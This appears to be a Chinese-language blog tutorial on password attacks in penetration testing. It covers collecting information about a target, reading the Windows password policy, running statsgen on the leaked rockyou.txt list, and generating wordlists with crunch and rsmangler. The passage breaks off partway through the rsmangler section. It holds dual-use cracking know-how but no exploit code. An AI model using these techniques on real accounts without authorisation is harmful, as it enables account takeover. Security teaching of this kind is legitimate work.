<!-- build time:Tue Dec 21 2021 14:39:51 GMT+0800 (GMT+08:00) --><!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script><link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"><script></script><meta name="theme-color" content="#222"><style>.pace .pace-progress{background:#1E92FB;height:3px}.pace .pace-progress-inner{box-shadow:0 0 10px #1E92FB,0 0 5px #1E92FB}.pace .pace-activity{border-top-color:#1E92FB;border-left-color:#1E92FB}</style><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="HGM141IpbHrSmnAmR6W_zE4bo9Z3f-yXLeHYT3bg1fk"><meta name="baidu-site-verification" content="code-5Ai1DA8e6T"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="渗透测试,密码攻击,"><link rel="alternate" href="/atom.xml" title="凡间的精灵" type="application/atom+xml"><meta name="description" content="密码攻击密码是身份验证的重要方式。密码攻击是通过各种技术获取目标用户的密码。密码攻击是所有渗透测试的一个重要部分。因为所有系统里最不安全的环节往往就是用户使用的密码。无论密码策略如何设置，大部分人都不愿意使用复杂的密码。一、创建字典这里的字典就是密码字典。如果要实施密码攻击，密码字典是必不可少的。用户可以通过对密码信息收集并分析，创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还能缩短破解"><meta name="keywords" content="渗透测试,密码攻击"><meta property="og:type" content="article"><meta property="og:title" content="密码攻击"><meta property="og:url" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;index.html"><meta property="og:site_name" content="凡间的精灵"><meta property="og:description" content="密码攻击密码是身份验证的重要方式。密码攻击是通过各种技术获取目标用户的密码。密码攻击是所有渗透测试的一个重要部分。因为所有系统里最不安全的环节往往就是用户使用的密码。无论密码策略如何设置，大部分人都不愿意使用复杂的密码。一、创建字典这里的字典就是密码字典。如果要实施密码攻击，密码字典是必不可少的。用户可以通过对密码信息收集并分析，创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还能缩短破解"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%871.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%872.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%873.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%874.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%875.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%876.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%877.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%878.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%879.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%8710.png"><meta property="og:updated_time" content="2021-01-07T01:43:29.249Z"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2021&#x2F;01&#x2F;05&#x2F;kali-mi-ma-gong-ji&#x2F;%E5%9B%BE%E7%89%871.png"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"5.1.4",sidebar:{position:"left",display:"always",offset:12,b2t:!0,scrollpercent:!0,onmobile:!0},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://chenzhonzhou.github.io/2021/01/05/kali-mi-ma-gong-ji/"><title>密码攻击 | 凡间的精灵</title><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">凡间的精灵</span> <span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">凡尘落素一精灵</p></div><div class="site-nav-toggle"><button><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i><br>站点地图</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i> </span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://chenzhonzhou.github.io/2021/01/05/kali-mi-ma-gong-ji/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Zhongzhou Chen"><meta itemprop="description" content=""><meta itemprop="image" content="/images/chen.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="凡间的精灵"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">密码攻击</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-05T16:38:35+08:00">2021-01-05 </time></span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span></span><div class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">7.4k </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">30</span></div></div></header><div class="post-body" itemprop="articleBody"><h1 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h1><p>密码是身份验证的重要方式。密码攻击是通过各种技术获取目标用户的密码。密码攻击是所有渗透测试的一个重要部分。因为所有系统里最不安全的环节往往就是用户使用的密码。无论密码策略如何设置，大部分人都不愿意使用复杂的密码。</p><h2 id="一、创建字典"><a href="#一、创建字典" class="headerlink" title="一、创建字典"></a>一、创建字典</h2><p>这里的字典就是密码字典。如果要实施密码攻击，密码字典是必不可少的。用户可以通过对密码信息收集并分析，创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还能缩短破解的时间。</p><h3 id="1-1-密码信息收集"><a href="#1-1-密码信息收集" class="headerlink" title="1.1 密码信息收集"></a>1.1 密码信息收集</h3><p>在创建密码字典之前，可以对密码进行收集。例如，搜集目标相关的邮箱、网站博文、推特文章、单位名称、人员名字等信息。因为大部分用户为了方便记忆，会使用最简单的密码，或者使用个人的相关信息（如单位名称、门牌号等）作为密码。此时，如果收集到这些信息，并添加到字典文件中，则能提升破解成功率。</p><h3 id="1-2-密码策略分析"><a href="#1-2-密码策略分析" class="headerlink" title="1.2 密码策略分析"></a>1.2 密码策略分析</h3><p>密码策略就是系统对用户设置的密码进行各项限制，如不能仅使用数字、不能使用连续的数字和英文字母等。例如，一些软件或系统都会设有对应的密码策略，以提高其安全性。此时，用户通过对这些设备的密码策略进行分析，可以有针对性地创建密码字典。</p><h4 id="1-2-1-软件-系统固有策略"><a href="#1-2-1-软件-系统固有策略" class="headerlink" title="1.2.1 软件/系统固有策略"></a>1.2.1 软件/系统固有策略</h4><p>固有策略就是指软件/系统本身内置的密码策略。为了安全起见，一些软件/系统都有固定的策略，以避免被轻易破解。如果软件/系统有固有策略，用户在注册账户时，会提醒密码长度、复杂度的最低要求。例如，安装Oracle数据库时，会提醒用户设置的密码是否足够复杂；安装Linux操作系统时，会提示有root用户密码设置要求等。此时，用户通过对软件/系统固有策略进行分析，可以创建对应策略的字典。</p><h4 id="1-2-2-加固策略"><a href="#1-2-2-加固策略" class="headerlink" title="1.2.2 加固策略"></a>1.2.2 加固策略</h4><p>加固策略是指软件/系统额外的建议标准。例如，在Windows系统中，会使用组策略来加固密码策略，使用户设置更安全的密码。此时，用户则可以使用组策略分析工具，以分析密码策略，然后构建更强大的密码字典。这里介绍如何使用组策略分析工具来分析密码策略。<br>使用组策略分析密码策略。具体操作步骤如下：</p><ol><li><p>使用Win+R组合键启动“运行”对话框。</p></li><li><p>在“打开”文本框中输入<code>gpedit.msc</code>命令，然后单击“确定”按钮，打开<code>本地组策略编辑器</code>界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%871.png" alt="图片1"></p></li><li><p>在左侧栏中依次选择“计算机配置”|“Windows设置”|“安全设置”|“账户策略”|“密码策略”选项，将显示密码策略设置界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%872.png" alt="图片2"></p></li><li><p>从该界面可以看到Windows系统密码策略的相关设置，如是否启用了复杂性要求、密码最小长度值、使用的期限，以及是否记住密码历史记录等。</p></li></ol><h4 id="1-2-3-分析已有密码字典策略"><a href="#1-2-3-分析已有密码字典策略" class="headerlink" title="1.2.3 分析已有密码字典策略"></a>1.2.3 分析已有密码字典策略</h4><p>用户可以分析目标用户相关人群泄漏的密码，获取同类人群的密码设定策略，然后以此构建一个新的字典。马尔可夫攻击方式（Markov Attack）可以分析已有的密码字典文件，并且统计密码字典每个字符的出现概率、位置分布以及前后关系。然后，结合这些规则，可以使用掩码生成更为有效的密码字典。Kali Linux提供了一个名为<strong><code>Stasprocessor</code></strong>工具，支持Markov Attack技术。</p><p>语法格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statsgen [options] passwords.txt</span><br></pre></td></tr></table></figure><p>以上语法中，options表示可用的选项；<br>passwords.txt表示分析的密码字典。</p><p>其中，该工具支持的选项及含义如下：</p><blockquote><p>–version：显示版本信息。<br>-h,–help：显示帮助信息。<br>-o password.masks,–output=passwords.masks：保存掩码和统计信息到一个文件。<br>–hiderare：隐藏比例小于1%的统计项。<br>–minlength=8：过滤密码最小长度为8的密码。<br>–maxlength=8：过滤密码最大长度为8的密码。<br>–charset=loweralpha,numeric：指定过滤的密码字符，使用逗号分隔。<br>–simplemask=stringdigit,allspecial：过滤密掩码格式，使用逗号分隔。</p></blockquote><p>使用statsgen工具分析rockyou.txt密码字典。具体操作步骤如下：</p><ol><li><p>执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># statsgen rockyou.txt</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将开始对指定的密码字典进行分析，并进行统计。其中，输出的信息包括工具的基本统计信息、密码长度、字符集、密码复杂度、简单掩码和高级掩码。其中，第一部分信息是statsgen工具的基本信息，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                       _ </span><br><span class="line">     StatsGen 0.0.3   | |</span><br><span class="line">      _ __   __ _  ___| | _</span><br><span class="line">     | <span class="string">'_ \ / _` |/ __| |/ /</span></span><br><span class="line"><span class="string">     | |_) | (_| | (__|   &lt; </span></span><br><span class="line"><span class="string">     | .__/ \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">     | |                    </span></span><br><span class="line"><span class="string">     |_| iphelix@thesprawl.org</span></span><br><span class="line"><span class="string">[*] Analyzing passwords in [rockyou.txt]    #分析的密码</span></span><br><span class="line"><span class="string">[+] Analyzing 100% (14344392/14344392) of passwords NOTE: Statistics below is relative to the number of analyzed passwords, not total number of passwords</span></span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，statsgen工具的版本信息、分析的密码文件及对密码文件的统计。通过分析输出的信息可以看到，该工具的版本为0.0.3；分析的密码字典为rockyou.txt；该密码字典共包括14344392个密码。</p></li><li><p>下面是密码长度统计信息，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[*] Length:                   <span class="comment">#长度</span></span><br><span class="line">[+]                         8: 20% (2966037)</span><br><span class="line">[+]                         7: 17% (2506272)</span><br><span class="line">[+]                         9: 15% (2191040)</span><br><span class="line">[+]                        10: 14% (2013695)</span><br><span class="line">[+]                         6: 13% (1947798)</span><br><span class="line">[+]                        11: 06% (866035)</span><br><span class="line">[+]                        12: 03% (555350)</span><br><span class="line">[+]                        13: 02% (364174)</span><br><span class="line">[+]                         5: 01% (259169)</span><br><span class="line">[+]                        14: 01% (248527)</span><br><span class="line">[+]                        15: 01% (161213)</span><br><span class="line">[+]                        16: 00% (118406)</span><br><span class="line">[+]                        17: 00% (36884)</span><br><span class="line">[+]                        18: 00% (23769)</span><br><span class="line">[+]                         4: 00% (17899)</span><br><span class="line">[+]                        19: 00% (15567)</span><br><span class="line">[+]                        20: 00% (13069)</span><br><span class="line">[+]                        21: 00% (7850)</span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure><p>以上信息是对密码字典中的密码长度进行了统计，并按照密码长度所占比例从大到小依次排序。其中，输出的信息分为3列，分别是密码的长度、所占密码总数的比例、密码总数。例如，第一行信息表示密码长度为8，所占密码总数的比例为20%，符合该长度的密码总数为2966037。</p></li><li><p>下面是对密码字符集进行的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] Character-set:                              <span class="comment">#字符集</span></span><br><span class="line">[+]             loweralphanum: 42% (6074867)    <span class="comment">#小写字母a～z和数字0～9的字条集合</span></span><br><span class="line">[+]                loweralpha: 25% (3726130)    <span class="comment">#小写字母a～z的字符集合</span></span><br><span class="line">[+]                   numeric: 16% (2346744)    <span class="comment">#数字0～9的字符集合</span></span><br><span class="line">[+]      loweralphaspecialnum: 02% (426353)     <span class="comment">#小写字母、特殊符号和数字的字符集合</span></span><br><span class="line">[+]             upperalphanum: 02% (407431)     <span class="comment">#大写字母a～z和数字0～9的字符集合</span></span><br><span class="line">[+]             mixedalphanum: 02% (382237)     <span class="comment">#小写字母、大写字母和数字字符集合</span></span><br><span class="line">[+]         loweralphaspecial: 02% (381623)     <span class="comment">#小写字母a～z和特殊符号的字符集合</span></span><br><span class="line">[+]                upperalpha: 01% (229875)     <span class="comment">#大写字母的字符集合</span></span><br><span class="line">[+]                mixedalpha: 01% (159310)     <span class="comment">#小写字母和大写字母的字符集合</span></span><br><span class="line">[+]                       all: 00% (53238)      <span class="comment">#所有字符集合</span></span><br><span class="line">[+]         mixedalphaspecial: 00% (49655)      <span class="comment">#大写字母和特殊符号的字符集合</span></span><br><span class="line">[+]                specialnum: 00% (46606)      <span class="comment">#特殊符号的字符集合</span></span><br><span class="line">[+]      upperalphaspecialnum: 00% (27737)      <span class="comment">#大写字母、特殊符号和数字的字符集合</span></span><br><span class="line">[+]         upperalphaspecial: 00% (26813)      <span class="comment">#大写字母和特殊符号的字符集合</span></span><br><span class="line">[+]                   special: 00% (5773)       <span class="comment">#特殊符号的字符集合</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，对密码字典中各种密码字符集进行了分析和统计。</p></li><li><p>下面是对密码复杂性的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Password complexity:                        <span class="comment">#密码复杂度</span></span><br><span class="line">[+]           digit: min(0) max(255)            <span class="comment">#数字0～9</span></span><br><span class="line">[+]           lower: min(0) max(255)            <span class="comment">#小写字母a～z</span></span><br><span class="line">[+]           upper: min(0) max(187)            <span class="comment">#大写字母A～Z</span></span><br><span class="line">[+]         special: min(0) max(255)            <span class="comment">#特殊符号</span></span><br></pre></td></tr></table></figure><p>以上是对密码的复杂性进行了统计。输出的信息分为3列，分别表示构成密码可能所拥有的字符、使用这种字符在密码中的最小个数和使用这种字符在密码中的最大个数。</p></li><li><p>下面是简单掩码的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] Simple Masks:                               <span class="comment">#简单掩码</span></span><br><span class="line">[+]               stringdigit: 37% (5339556)    <span class="comment">#字母和数字</span></span><br><span class="line">[+]                    string: 28% (4115315)    <span class="comment">#字母</span></span><br><span class="line">[+]                     digit: 16% (2346744)    <span class="comment">#数字</span></span><br><span class="line">[+]               digitstring: 04% (663951)     <span class="comment">#数字和字母</span></span><br><span class="line">[+]                 othermask: 04% (576325)     <span class="comment">#其他类型</span></span><br><span class="line">[+]         stringdigitstring: 03% (450742)     <span class="comment">#字母、数字、字母</span></span><br><span class="line">[+]       stringspecialstring: 01% (204441)     <span class="comment">#字母、特殊符号、字母</span></span><br><span class="line">[+]        stringspecialdigit: 01% (167816)     <span class="comment">#字母、特殊符号、数字</span></span><br><span class="line">[+]             stringspecial: 01% (148328)     <span class="comment">#字母和特殊符号</span></span><br><span class="line">[+]          digitstringdigit: 00% (130517)     <span class="comment">#数字、字母、数字</span></span><br><span class="line">[+]        stringdigitspecial: 00% (77378)      <span class="comment">#字母、数字、特殊符号</span></span><br><span class="line">[+]      specialstringspecial: 00% (25127)      <span class="comment">#特殊符号、字母、特殊符号</span></span><br><span class="line">[+]        digitspecialstring: 00% (16821)      <span class="comment">#数字、特殊符号、字母</span></span><br><span class="line">[+]             specialstring: 00% (14496)      <span class="comment">#特殊符号和字母</span></span><br><span class="line">[+]        digitstringspecial: 00% (12242)      <span class="comment">#数字、字母、特殊符号</span></span><br><span class="line">[+]         digitspecialdigit: 00% (12114)      <span class="comment">#数字、特殊符号、数字</span></span><br><span class="line">[+]              digitspecial: 00% (11017)      <span class="comment">#数字和特殊符号</span></span><br><span class="line">[+]        specialstringdigit: 00% (9609)       <span class="comment">#特殊符号、字母和数字</span></span><br><span class="line">[+]        specialdigitstring: 00% (8328)       <span class="comment">#特殊符号、数字和字母</span></span><br><span class="line">[+]                   special: 00% (5773)       <span class="comment">#特殊符号</span></span><br><span class="line">[+]              specialdigit: 00% (4142)       <span class="comment">#特殊符号和数字</span></span><br><span class="line">[+]       specialdigitspecial: 00% (3610)       <span class="comment">#特殊符号、数字和特殊符号</span></span><br></pre></td></tr></table></figure><p>以上信息是对密码字符串掩码格式进行了简单统计。例如，stringdigit表示前面是字母，后面是数字；stringdigitstring表示前面是字母、中间是数字、后面是字母。</p></li><li><p>下面是密码字符串掩码格式的高级统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[*] Advanced Masks:                             <span class="comment">#高级掩码</span></span><br><span class="line">[+]           ?l?l?l?l?l?l?l?l: 04% (687991)</span><br><span class="line">[+]               ?l?l?l?l?l?l: 04% (601152)</span><br><span class="line">[+]             ?l?l?l?l?l?l?l: 04% (585014)</span><br><span class="line">[+]          ?l?l?l?l?l?l?l?l?l: 03% (516830)</span><br><span class="line">[+]         ?l?l?l?l?l?l?l?d?d: 01% (273624)</span><br><span class="line">[+]        ?l?l?l?l?l?l?l?l?l?l?l: 01% (267733)</span><br><span class="line">[+]          ?l?l?l?l?d?d?d?d: 01% (235360)</span><br><span class="line">[+]              ?l?l?l?l?d?d: 01% (215074)</span><br><span class="line">[+]        ?l?l?l?l?l?l?l?l?d?d: 01% (213109)</span><br><span class="line">[+]              ?l?l?l?l?l?l?d: 01% (193097)</span><br><span class="line">[+]             ?l?l?l?l?l?l?l?d: 01% (189847)</span><br><span class="line">[+]       ?l?l?l?l?l?l?l?l?l?l?l?l: 01% (189355)</span><br><span class="line">[+]            ?l?l?l?d?d?d?d: 01% (178304)</span><br><span class="line">[+]          ?l?l?l?l?l?d?d?d?d: 01% (173559)</span><br><span class="line">[+]         ?l?l?l?l?l?l?d?d?d?d: 01% (160592)</span><br><span class="line">[+]            ?l?l?l?l?l?l?l?l?d: 01% (160054)</span><br><span class="line">[+]            ?l?l?l?l?l?d?d?d: 01% (152400)</span><br></pre></td></tr></table></figure><p>以上信息是对密码字符串进行了高级统计。其中，高级统计就是对密码文件中的密码字符用掩码格式进行了表示。统计后会用到4种掩码格式，每种格式都由一个？（问号）加一个小写字母来表示，表示一个字符集合。这4种掩码格式的表示及含义如下：</p><blockquote><p>?l：表示小写字母a～z的字符集合。<br>?u：表示大写字母A～Z的字符集合。<br>?d：表示数字0～9的字符集合。<br>?s：表示特殊符号的字符集合。</p></blockquote><p>在获取的掩码格式中，一个掩码表示密码中的一位数。例如，?l?l?l?l?d?d?d?d掩码格式表示由4个?l和4个?d组成的一个8位长度的密码。其中，前4位密码由小写字母a～z构成；后4位密码由数字0～9构成。</p></li></ol><h3 id="1-3-生成字典"><a href="#1-3-生成字典" class="headerlink" title="1.3 生成字典"></a>1.3 生成字典</h3><p>当用户收集足够的目标用户信息及密码策略后，就可以根据获取的信息来创建密码字典了。下面使用Crunch、rsmangler和rtgen工具生成字典。</p><h4 id="1-3-1-使用Crunch工具"><a href="#1-3-1-使用Crunch工具" class="headerlink" title="1.3.1 使用Crunch工具"></a>1.3.1 使用Crunch工具</h4><p>Crunch是一种密码字典生成工具。它可以按照指定的规则生成密码字典，用户可以灵活地定制自己的密码字典文件。</p><p>使用Crunch工具生成字典的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch &lt;min&gt; &lt;max&gt; [&lt;charset string&gt;][options]</span><br></pre></td></tr></table></figure><p>以上语法中，参数<code>&lt;min&gt;</code>表示生成密码的最小长度；<code>&lt;max&gt;</code>表示生成密码的最大长度；<code>&lt;charset string&gt;</code>表示指定的字符集；<code>[options]</code>表示有效的选项。其中，常用的选项及含义如下：</p><blockquote><p>-o：指定生成的密码字典文件名；<br>-b number[type]：指定写入文件最大的字节数。该大小可以指定KB、MB或GB，但是必须与-o START选项一起使用；<br>-t：设置使用的特殊格式；<br>-l：该选项用于当-t选项指定@、%或^时，识别占位符的一些字符。</p></blockquote><p>Crunch工具默认提供的字符集保存在<code>/usr/share/crunch/charset.lst</code>文件中。此时，用户可以直接使用这些字符集来生成对应的密码字典。用户可以使用cat命令查看所有的字符集。</p><p>使用Crunch工具生成一个最小长度为8、最大长度为10的密码字典文件，并保存到<code>/root/crunch.txt</code>文件。其中，使用的字符集hex-lower，即0123456789abcdef。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crunch 8 10 hex-lower -o /root/crunch.txt                                                     2 ⨯</span></span><br><span class="line">Crunch will now generate the following amount of data: 13304332288 bytes</span><br><span class="line">12688 MB</span><br><span class="line">12 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1224736768</span><br><span class="line"></span><br><span class="line">crunch:   2% completed generating output</span><br><span class="line"></span><br><span class="line">crunch:   5% completed generating output</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，将生成一个大小为12GB的字典，共有1224736768个密码。而且，以百分比的形式显示了生成的密码进度。</p><h4 id="1-3-2-使用rsmangler工具"><a href="#1-3-2-使用rsmangler工具" class="headerlink" title="1.3.2 使用rsmangler工具"></a>1.3.2 使用rsmangler工具</h4><p>rsmangler是一个基于单词列表关键词生成字典的工具。使用该工具可以基于用户收集的信息，并利用常见密码构建规则来构建字典。</p><p>rsmangler工具的语法格式如下：</p><blockquote><p>rsmangler -f wordlist.txt -o new_passwords.txt</p></blockquote><p>以上语法中的选项及含义如下：</p><blockquote><p>-f,–file：指定输入文件，即用户收集到的密码单词。<br>-o,–output：指定生成的字典文件名称。</p></blockquote><p>使用rsmangler工具生成字典。具体操作步骤如下：</p><ol><li><p>创建一个文件，用来保存收集的密码单词。这里将创建一个名为test的文件，简单保存两个单词用来生成新的字典。如下：</p><figure 